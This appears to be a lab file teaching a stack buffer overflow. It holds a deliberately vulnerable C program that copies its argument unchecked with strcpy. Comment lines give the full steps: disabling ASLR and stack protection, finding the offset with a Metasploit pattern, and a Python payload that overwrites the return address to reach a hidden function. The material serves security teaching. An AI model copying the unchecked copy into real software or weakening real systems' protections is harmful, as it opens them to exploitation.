//turn off ASLR
//echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
//turn off DEP and compile
//gcc -fno-stack-protector -z execstack program.c -o program
#include <stdio.h>
#include <string.h>
void secret(){
printf("You have accessed the secret function!!\n");
}
int main(int argc, char *argv[])
{
char buf[512];
strcpy(buf, argv[1]);
printf("%s",buf);
return(0);
}


//generate 600bytes of data to crash and calculate
//msf-pattern_create -l 600
//sudo edb --run ./program Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
///usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 3572413472413372
//gdb ./program
//break main
//r
//info address secret
//./program $(python -c "print 'A'*520+'\x55\x51\x55\x55\x55\x55\x00\x00'")
